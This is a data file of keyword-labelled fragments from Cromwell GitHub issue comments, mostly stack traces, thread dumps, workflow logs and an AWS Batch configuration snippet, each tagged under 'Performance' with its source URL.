cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(Ba",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99455,concurren,concurrent,99455,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"thanks for you reply. i mean in `aws backend ` mode, instead of `local mode`. there is no option to set `submit-docker`, i attached the backend part of my aws.conf as follows. ```bash; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://yuce/cromwell-execution""; // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""default"". numSubmitAttempts = 3; numCreateDefinitionAttempts = 3. concurrent-job-limit = 16. default-runtime-attributes {; queueArn: ""arn:aws-cn:batch:cn-northwest-1:723230375162:job-queue/first-run-job-queue"",; }. filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }; }; }; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-701201752:619,concurren,concurrent-job-limit,619,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-701201752,4,"['concurren', 'queue']","['concurrent-job-limit', 'queue', 'queueArn']"
Performance,til.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.s,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:5747,concurren,concurrent,5747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,1,['concurren'],['concurrent']
Performance,til.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(WorkflowFailSlowSpec.scala:30); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.s,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:5753,concurren,concurrent,5753,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,1,['concurren'],['concurrent']
Performance,til.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.s,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:5823,concurren,concurrent,5823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,1,['concurren'],['concurrent']
Performance,til.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(WorkflowFailSlowSpec.scala:30); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.s,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:5829,concurren,concurrent,5829,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,1,['concurren'],['concurrent']
Performance,"tion [0x00007fd9ccfce000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at cromwell.engine.workflow.WorkflowManagerActor$$anonfun$addShutdownHook$1.apply$mcV$sp(WorkflowManagerActor.scala:125); at scala.sys.ShutdownHookThread$$anon$1.run(ShutdownHookThread.scala:34). ""pool-1-thread-20"" #95 prio=5 os_prio=0 tid=0x00007fdaa80c0000 nid=0xa56 waiting on condition [0x00007fda90575000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(Thre",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1147,concurren,concurrent,1147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"tion could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStre",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:1564,concurren,concurrent,1564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"tion could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:17,54] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.AllelicCNV:3:1] Status change from Running to Success; [2016-10-28 14:38:17,67] [info] WorkflowExecutionActor-a3dd8163-de37-4467-a227-5364959a8940 [a3dd8163]: Starting calls: case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1, case_gatk_acnv_workflow.PlotACNVResults:3:1; [2016-10-28 14:38:18,14] [info] JesRun [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1]: JES Run ID is operations/ENPH6N2AKxi-zoCK0M65gEAgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; [2016-10-28 14:38:18,31] [info] JesRun [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:3:1]: JES Run ID is operations/EPfI6N2AKxi_iI64ku3M2xAgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; [2016-10-28 14:38:43,07] [info] JesAsyncBac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:12309,concurren,concurrent,12309,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"titute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/async/AsyncBackendJobExecutionActor.scala) file, and some of the important stores would be the [ExecutionStore](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/core/src/main/scala/cromwell/core/ExecutionStore.scala), the [BackendJobDescriptor and BackendJobDescriptorKey](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/package.scala#L17-31), which contain the [Call containing the AST](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Call.scala#L10-61) and sequence of [Tasks](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Task.scala). Since the WorkflowManagerActor (WMA) is just an asynchronous queue selecting the workflow based on the root and its dependencies, then it sounds to be just a scheduling pool service submitting to the EJEA, which prepares it for the specific backend. The recovery for the EJEA is assumed to be an uniform designed protocol, which prepares the execution for the specific backend. . Regarding the backend recovery, since at the core the implementations is really Java (even though everything is in Scala), one can save the running state periodically through serialized snapshots, using something like [Apache JavaFlow](http://commons.apache.org/sandbox/commons-javaflow/) or another similar approach. If this becomes too cumbersome and the cost of resubmitting a job to a specific Backend is on the average time-span not excessive, then resubmitting the whole job might be Occam's razor. There are other approaches, depending on the preferability of flexibility, and I am sure I might have miswrote/misinterpreted something here based on my periodic analysis of the source code - so feel free to correct me :). Thanks,; ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371:1142,queue,queue,1142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371,1,['queue'],['queue']
Performance,"tor$$anonfun$1.apply(CallCacheWriteActor.scala:19); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JES error code 10. Message: 15: Gsutil failed: failed to upload logs for ""gs:/; /broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19; ec38f93/call-M2/shard-108/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full; _dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/7",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:1545,concurren,concurrent,1545,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,1,['concurren'],['concurrent']
Performance,tractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:423); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:399); 	at cromwell.backend.google.pipelines.v1alpha2.GenomicsFactory$$anon$1.runRequest(GenomicsFactory.scala:85); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline(PipelinesApiRunCreationClient.scala:53); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline$(PipelinesApiRunCreationClient.scala:48); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.runPipeline(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$createNewJob$19(PipelinesApiAsyncBackendJobExecutionActor.scala:572); 	at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.ru,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629:2051,concurren,concurrent,2051,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629,1,['concurren'],['concurrent']
Performance,ts of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:246); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:144); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:138); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /home/pgrosu/me/cromwell/cromwell/cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/rc; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214); at java.nio.file.Files.newByteChannel(Files.java:361); at java.nio.file.Files.newByteChannel(Files.java:407); at java.nio.file.Files.readAllBytes(Files.java:3149); at better.files.File.loadBytes(File.scala:80); at better.files.File.byteArray(File.scala:81); at better.files.File.contentAsString(File.scala:91); at cromwell.engine.backend.local.LocalBackend$$anonfun$3.apply$mcI$sp(LocalBackend.scala:209); at cromwell.engine.backend.local.LocalBackend$$anonfun$3.app,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:5113,concurren,concurrent,5113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,1,['concurren'],['concurrent']
Performance,un$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; 905198- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; 905199- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905200- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905201- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; 905202- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; 905203- at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; 905204- at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; 905205- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 905206- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 905207- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 905208- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 905209- at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; 905210- at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; 905211- at 